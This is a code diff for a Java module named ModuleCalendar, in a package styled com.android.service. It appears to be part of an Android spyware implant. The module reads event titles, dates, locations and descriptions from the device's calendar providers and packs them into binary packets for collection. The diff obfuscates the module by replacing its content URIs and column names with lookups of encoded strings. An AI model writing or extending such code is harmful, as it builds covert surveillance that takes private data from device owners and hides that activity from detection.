@@ -14,6 +14,7 @@ import android.database.Cursor;
 import android.net.Uri;
 
 import com.android.service.LogR;
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfModule;
@@ -33,7 +34,6 @@ import com.android.service.util.WChar;
 public class ModuleCalendar extends BaseModule {
 
 	private static final String TAG = "ModuleCalendar"; //$NON-NLS-1$
-
 
 	private static final int FLAG_ALLDAY = 0x00000040;
 
@@ -73,6 +73,10 @@ public class ModuleCalendar extends BaseModule {
 			try {
 				calendar = (HashMap<Long, Long>) markupCalendar.readMarkupSerializable();
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
 				}
@@ -101,6 +105,10 @@ public class ModuleCalendar extends BaseModule {
 				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
 			}
 		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
 			}
@@ -116,14 +124,18 @@ public class ModuleCalendar extends BaseModule {
 
 		try {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): Calendar");
+				Check.log(TAG + " (go): Calendar"); //$NON-NLS-1$
 			}
 			if (calendar()) {
 				serializeCalendar();
 			}
 		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go) Error: " + ex);
+				Check.log(TAG + " (go) Error: " + ex); //$NON-NLS-1$
 			}
 		}
 	}
@@ -137,18 +149,18 @@ public class ModuleCalendar extends BaseModule {
 		HashSet<String> calendars;
 		String contentProvider;
 
-		contentProvider = "content://calendar";
+		contentProvider = Messages.getString("d.18"); //$NON-NLS-1$
 		calendars = selectCalendars(contentProvider);
 
 		if (calendars == null || calendars.isEmpty()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (calendar): opening 2.2 style");
+				Check.log(TAG + " (calendar): opening 2.2 style"); //$NON-NLS-1$
 			}
-			contentProvider = "content://com.android.calendar";
+			contentProvider = Messages.getString("d.19"); //$NON-NLS-1$
 			calendars = selectCalendars(contentProvider);
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (calendar): opening 2.1 style");
+				Check.log(TAG + " (calendar): opening 2.1 style"); //$NON-NLS-1$
 			}
 		}
 
@@ -159,13 +171,13 @@ public class ModuleCalendar extends BaseModule {
 		for (String id : calendars) {
 			int calendar_id = Integer.parseInt(id);
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (calendar): " + calendar_id);
+				Check.log(TAG + " (calendar): " + calendar_id); //$NON-NLS-1$
 			}
-			Uri.Builder builder = Uri.parse(contentProvider + "/events").buildUpon();
+			Uri.Builder builder = Uri.parse(contentProvider + Messages.getString("d.17")).buildUpon(); //$NON-NLS-1$
 			String textUri = builder.build().toString();
 
-			Cursor eventCursor = managedQuery(builder.build(), new String[] { "_id", "title", "dtstart", "dtend",
-					"rrule", "allDay", "eventLocation", "description" }, "calendar_id=" + id, null, "_id ASC");
+			Cursor eventCursor = managedQuery(builder.build(), new String[] { Messages.getString("d.7"), Messages.getString("d.8"), Messages.getString("d.9"), Messages.getString("d.10"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+					Messages.getString("d.11"), Messages.getString("d.12"), Messages.getString("d.13"), Messages.getString("d.14") }, Messages.getString("d.15") + id, null, Messages.getString("d.16")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
 
 			while (eventCursor.moveToNext()) {
 				int index = 0;
@@ -174,16 +186,16 @@ public class ModuleCalendar extends BaseModule {
 				final Date begin = new Date(eventCursor.getLong(index++));
 				final Date end = new Date(eventCursor.getLong(index++));
 				final String rrule = eventCursor.getString(index++);
-				final Boolean allDay = !eventCursor.getString(index++).equals("0");
+				final Boolean allDay = !eventCursor.getString(index++).equals("0"); //$NON-NLS-1$
 
 				final String location = eventCursor.getString(index++);
 				// final String syncAccount = eventCursor.getString(5);
-				String syncAccount = "";
+				String syncAccount = ""; //$NON-NLS-1$
 				final String description = eventCursor.getString(index++);
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (calendar): Title: " + title + " Begin: " + begin + " End: " + end + " All Day: "
-							+ allDay + " Location: " + location + " SyncAccount:" + syncAccount + " Description: "
+					Check.log(TAG + " (calendar): Title: " + title + " Begin: " + begin + " End: " + end + " All Day: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+							+ allDay + " Location: " + location + " SyncAccount:" + syncAccount + " Description: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 							+ description);
 				}
 
@@ -192,8 +204,12 @@ public class ModuleCalendar extends BaseModule {
 					// calculate the crc of the contact
 					packet = preparePacket(idEvent, title, description, location, begin, end, rrule, allDay);
 				} catch (Exception ex) {
+					if (Cfg.EXCEPTION) {
+						Check.log(ex);
+					}
+
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (calendar) Error: " + ex);
+						Check.log(TAG + " (calendar) Error: " + ex); //$NON-NLS-1$
 					}
 					continue;
 				}
@@ -221,24 +237,24 @@ public class ModuleCalendar extends BaseModule {
 	}
 
 	private HashSet<String> selectCalendars(String contentProvider) {
-		String[] projection = new String[] { "_id", "displayName", "selected", "ownerAccount" };
+		String[] projection = new String[] { Messages.getString("d.3"), Messages.getString("d.4"), Messages.getString("d.5"), Messages.getString("d.6") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 		// Uri calendars = Uri.parse("content://calendar/calendars");
-		Uri calendars = Uri.parse(contentProvider + "/calendars");
+		Uri calendars = Uri.parse(contentProvider + Messages.getString("d.2")); //$NON-NLS-1$
 
 		HashSet<String> calendarIds = new HashSet<String>();
 
-		Cursor managedCursor = managedQuery(calendars, projection, "selected=1", null, null);
+		Cursor managedCursor = managedQuery(calendars, projection, "selected=1", null, null); //$NON-NLS-1$
 
 		while (managedCursor != null && managedCursor.moveToNext()) {
 
 			final String _id = managedCursor.getString(0);
 			final String displayName = managedCursor.getString(1);
-			final Boolean selected = !managedCursor.getString(2).equals("0");
+			final Boolean selected = !managedCursor.getString(2).equals("0"); //$NON-NLS-1$
 			final String ownerAccount = managedCursor.getString(2);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (selectCalendars): Id: " + _id + " Display Name: " + displayName + " Selected: "
-						+ selected + " OwnerAccount: " + ownerAccount);
+				Check.log(TAG + " (selectCalendars): Id: " + _id + " Display Name: " + displayName + " Selected: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+						+ selected + " OwnerAccount: " + ownerAccount); //$NON-NLS-1$
 			}
 
 			calendarIds.add(_id);
@@ -313,9 +329,9 @@ public class ModuleCalendar extends BaseModule {
 
 			if (rrule != null) {
 				if (description == null) {
-					description = "RULE: " + rrule;
+					description = Messages.getString("d.0") + rrule; //$NON-NLS-1$
 				} else {
-					description += " \nRULE: " + rrule;
+					description += Messages.getString("d.1") + rrule; //$NON-NLS-1$
 				}
 			}
 
@@ -337,13 +353,17 @@ public class ModuleCalendar extends BaseModule {
 			databuffer.writeInt(size);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (preparePacket): " + Utils.byteArrayToHex(packet));
+				Check.log(TAG + " (preparePacket): " + Utils.byteArrayToHex(packet)); //$NON-NLS-1$
 			}
 			return packet;
 
 		} catch (IOException ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (preparePacket) Error: " + ex);
+				Check.log(TAG + " (preparePacket) Error: " + ex); //$NON-NLS-1$
 			}
 		}
 		return null;
